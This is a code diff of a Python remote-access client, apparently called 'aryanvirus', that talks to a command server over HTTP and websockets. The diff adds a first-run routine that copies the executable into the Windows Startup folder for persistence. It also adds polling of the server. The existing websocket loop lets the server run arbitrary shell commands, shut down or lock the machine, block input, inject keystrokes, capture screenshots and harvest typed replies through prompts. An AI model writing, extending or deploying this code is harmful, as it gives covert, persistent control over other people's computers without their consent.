@@ -18,8 +18,50 @@ from notepadType import notepad_write
 from prompt import alertPrompt
 from prompt import inputPrompt
 
-#serverUrl = "https://aryanvirus.onrender.com"
-serverUrl = "http://localhost:3000"
+import shutil
+from pathlib import Path
+import sys
+
+FLAG_FILE = Path(os.getenv('APPDATA')) / "my_program_first_run.flag"
+
+def add_to_startup():
+    print("initial move")
+    try:
+        print("startedmvoe")
+        startup_dir = Path(os.getenv('APPDATA')) / r"Microsoft\Windows\Start Menu\Programs\Startup"
+        # startup_dir = Path(os.getenv('ProgramData')) / r"Microsoft\Windows\Start Menu\Programs\Startup"
+        exe_path = Path(sys.argv[0]).resolve()  # now this is the exe
+        destination = startup_dir / exe_path.name
+
+        if not destination.exists():
+            shutil.copy(exe_path, destination)
+    except Exception as e:
+        print(f"Failed to add to startup: {e}")
+
+if not FLAG_FILE.exists():
+    add_to_startup()
+    FLAG_FILE.touch()
+
+serverUrl = "http://localhost:3000"    
+uri = "ws://localhost:3000"
+
+# serverUrl = "https://aryanvirus.onrender.com"
+# uri = "wss://aryanvirus.onrender.com" 
+
+
+POLL_INTERVAL = 60
+
+"""check server variable to see if we should connect"""
+def should_connect():
+    try:
+        r = requests.get(f"{serverUrl}/shouldconnect",timeout=5)
+        j = r.json()
+        return bool(j.get("connect"))
+    except:
+        return False
+
+
+
 def take_screenshot():
     try:
         pc_name = socket.gethostname()
@@ -43,9 +85,7 @@ def handle_msg(msg):
             elif msg == "unblock":
                 blockInput.unblock_all()
             elif msg == "shutdown":
-                os.system("shutdown /s /t 0")   
-            elif msg=="cmd":
-                    print("error")    
+                os.system("shutdown /s /t 0")      
             elif msg=="desktop":
                 pg.keyDown("win")
                 pg.press("d")
@@ -56,6 +96,8 @@ def handle_msg(msg):
                 take_screenshot()
             elif msg=="lock":
                 os.system("rundll32.exe user32.dll,LockWorkStation")
+            elif msg=="end":
+                os._exit(0)
     except:
         pass
 def send_data():
@@ -65,17 +107,16 @@ def send_data():
         pc_id = f"{pc_name}_{mac}"
         url = f"{serverUrl}/posttrace"
         requests.get(url,params={"pc_id":pc_id})
-    except:
-        pass    
+    except Exception as e:
+        print(e)
+        
 
 def send_handler():
     threading.Thread(target=send_data).start()
 
 keyboard.add_hotkey("ctrl+shift+q",send_handler)
                   
-async def listen():
-    # uri = "wss://aryanvirus.onrender.com" 
-    uri = "ws://localhost:3000" 
+async def listen(): 
     pc_name = socket.gethostname()
     mac = hex(uuid.getnode())
     pc_id = f"{pc_name}_{mac}"
@@ -86,8 +127,15 @@ async def listen():
                 while True:
                     message = await websocket.recv() 
                     print("Recieved : ", message)
-                    if message.startswith("subprocess"):
-                        
+                    await websocket.send(f"ACK:{pc_id}")
+                    if message == "checkflag":
+                        try:
+                            r = requests.get(f"{serverUrl}/shouldconnect",timeout=5)
+                            if not r.json().get("connect",False):
+                                await websocket.close()
+                                return
+                        except:pass
+                    elif message.startswith("subprocess"):
                         command = message[len("subprocess "):]
                         try:
                             subprocess.run(command,shell=True)
@@ -99,7 +147,6 @@ async def listen():
                         try:
                             webbrowser.open(command)
                         except:pass    
-
                     elif message.startswith("type"):
                     
                         command = message[len("type "):]
@@ -112,7 +159,6 @@ async def listen():
                             notepad_write(command,True)
                         except:pass         
                     elif message.startswith("notepadtype"):
-                    
                         command = message[len("notepadtype "):]
                         notepad_write(command,False) 
                     elif message.startswith("press"):
@@ -125,9 +171,11 @@ async def listen():
                         alertPrompt(command) 
                     elif message.startswith("inputprompt"):
                     
-                        command = message[len("inputprompt "):]
-                        value=inputPrompt(command)  
-                        await websocket.send(value)
+                        try:
+                            command = message[len("inputprompt "):]
+                            value=inputPrompt(command)  
+                            await websocket.send(value)
+                        except:pass    
                     elif message.startswith("backspace"):
                     
                         command = message[len("backspace "):]
@@ -173,4 +221,16 @@ async def listen():
             print("connection lost . Reconnecting in 3 seconds ...")
             await asyncio.sleep(3)
 
-asyncio.run(listen())
+
+async def poll_loop():
+    while True:
+        try:
+            if should_connect():
+                print("Server says connect - Starting Websocket")
+                await listen()
+            else:
+                print("Server says No connect - sleeping 60s")
+                await asyncio.sleep(POLL_INTERVAL)
+        except:pass
+
+asyncio.run(poll_loop())
